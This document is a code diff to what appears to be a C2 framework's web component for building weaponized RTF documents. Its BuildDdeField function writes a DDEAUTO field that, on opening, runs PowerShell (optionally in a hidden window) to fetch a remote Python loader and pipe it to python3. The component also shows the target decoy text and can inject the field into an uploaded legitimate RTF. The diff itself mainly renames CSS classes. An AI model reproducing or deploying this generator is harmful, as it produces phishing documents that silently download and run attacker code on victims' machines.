@@ -18,26 +18,26 @@
 
         <div class="loader-section">
             <h4 class="loader-section-title">1 — Python Loader URL</h4>
-            <p class="loader-text rtf-field-hint">
+            <p class="loader-text loader-hint">
                 URL of the Python loader script. The DDE field will run <code>powershell -enc &lt;base64&gt;</code> when the document is opened.
             </p>
             <C2InputActions Value="@_loaderUrl" ValueChanged="OnLoaderUrlChanged" Monospace BindOnInput
                             Placeholder="https://raw.githubusercontent.com/.../loader.py" />
-            <label class="rtf-toggle">
+            <label class="loader-toggle">
                 <input type="checkbox" checked="@_hidden" @onchange="OnHiddenChanged" />
-                <span class="rtf-toggle-label">Hidden window</span>
-                <span class="loader-text rtf-field-hint">@(_hidden ? "PowerShell runs hidden — no window appears" : "PowerShell window is visible")</span>
+                <span class="loader-toggle-label">Hidden window</span>
+                <span class="loader-text loader-hint">@(_hidden ? "PowerShell runs hidden — no window appears" : "PowerShell window is visible")</span>
             </label>
         </div>
 
         <div class="loader-section">
             <h4 class="loader-section-title">2 — Output</h4>
-            <div class="rtf-mode-tabs">
-                <button class="rtf-mode-tab @(_mode == Mode.Generate ? "rtf-mode-tab--active" : "")"
+            <div class="loader-tabs">
+                <button class="loader-tab @(_mode == Mode.Generate ? "loader-tab--active" : "")"
                         @onclick="() => SetMode(Mode.Generate)">
                     <C2Icon Name="file-text" Size="Size.Xs" /> Generate
                 </button>
-                <button class="rtf-mode-tab @(_mode == Mode.Upload ? "rtf-mode-tab--active" : "")"
+                <button class="loader-tab @(_mode == Mode.Upload ? "loader-tab--active" : "")"
                         @onclick="() => SetMode(Mode.Upload)">
                     <C2Icon Name="upload" Size="Size.Xs" /> Upload Custom
                 </button>
@@ -45,23 +45,23 @@
 
             @if (_mode == Mode.Generate)
             {
-                <div class="rtf-mode-body">
-                    <p class="loader-text rtf-field-hint">
+                <div class="loader-tab-body">
+                    <p class="loader-text loader-hint">
                         Decoy text shown after the DDE field executes. This is what the target sees in the document.
                     </p>
                     <C2Input Value="@_docTitle" ValueChanged="v => { _docTitle = v; Rebuild(); }" BindOnInput
-                             Placeholder="Document title" CssClass="rtf-input-spacing" />
-                    <textarea class="rtf-textarea" @bind="_docBody" @bind:event="oninput" @bind:after="Rebuild"
+                             Placeholder="Document title" CssClass="loader-input-spacing" />
+                    <textarea class="loader-textarea" @bind="_docBody" @bind:event="oninput" @bind:after="Rebuild"
                               placeholder="Document body text..." rows="4"></textarea>
 
-                    <div class="rtf-preview-wrap">
-                        <pre class="rtf-preview">@_rtfContent</pre>
+                    <div class="loader-preview-wrap">
+                        <pre class="loader-preview">@_rtfContent</pre>
                     </div>
-                    <div class="rtf-actions">
+                    <div class="loader-actions">
                         <button class="loader-link-btn" @onclick="DownloadRtf">
                             <C2Icon Name="download" Size="Size.Xs" /> Download RTF
                         </button>
-                        <button class="loader-copy-btn rtf-copy-wide" @onclick="() => Copy(_rtfContent)" title="Copy RTF source">
+                        <button class="loader-copy-btn loader-copy-wide" @onclick="() => Copy(_rtfContent)" title="Copy RTF source">
                             <C2Icon Name="copy" Size="Size.Xs" /> Copy
                         </button>
                     </div>
@@ -69,11 +69,11 @@
             }
             else
             {
-                <div class="rtf-mode-body">
-                    <p class="loader-text rtf-field-hint">
+                <div class="loader-tab-body">
+                    <p class="loader-text loader-hint">
                         Upload your own RTF document. The DDE field will be injected after the header, preserving your formatting and content.
                     </p>
-                    <div class="rtf-actions">
+                    <div class="loader-actions">
                         <label class="loader-link-btn" style="cursor:pointer">
                             <C2Icon Name="upload" Size="Size.Xs" /> Upload RTF
                             <InputFile OnChange="OnCustomRtfUpload" accept=".rtf" style="display:none" />
@@ -85,14 +85,14 @@
                     </div>
                     @if (!string.IsNullOrEmpty(_customRtfContent))
                     {
-                        <div class="rtf-preview-wrap">
-                            <pre class="rtf-preview">@_customRtfContent</pre>
+                        <div class="loader-preview-wrap">
+                            <pre class="loader-preview">@_customRtfContent</pre>
                         </div>
-                        <div class="rtf-actions">
+                        <div class="loader-actions">
                             <button class="loader-link-btn" @onclick="DownloadCustomRtf">
                                 <C2Icon Name="download" Size="Size.Xs" /> Download Injected RTF
                             </button>
-                            <button class="loader-copy-btn rtf-copy-wide" @onclick="() => Copy(_customRtfContent)" title="Copy RTF source">
+                            <button class="loader-copy-btn loader-copy-wide" @onclick="() => Copy(_customRtfContent)" title="Copy RTF source">
                                 <C2Icon Name="copy" Size="Size.Xs" /> Copy
                             </button>
                         </div>
@@ -158,7 +158,6 @@
 
     private static string BuildDdeField(string loaderUrl, bool hidden)
     {
-        // Always use PowerShell (v2.0+).
         var windowStyle = hidden ? "-W Hidden " : "";
         var psArgs = $"{windowStyle}-NoP -C irm {loaderUrl} | python3";
         return @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe """ + RtfEscape(psArgs) + @"""}}{" + @"\fldrslt }}";
@@ -237,7 +236,6 @@
     {
         var ddeField = BuildDdeField(loaderUrl, visible) + "\n";
 
-        // Insert DDE field right after the first \pard (start of document body)
         var pardIdx = rtfContent.IndexOf("\\pard");
         if (pardIdx >= 0)
         {
@@ -246,7 +244,6 @@
             return rtfContent[..(insertIdx + 1)] + ddeField + rtfContent[(insertIdx + 1)..];
         }
 
-        // Fallback: insert before the final closing brace
         var lastBrace = rtfContent.LastIndexOf('}');
         if (lastBrace >= 0)
             return rtfContent[..lastBrace] + ddeField + rtfContent[lastBrace..];
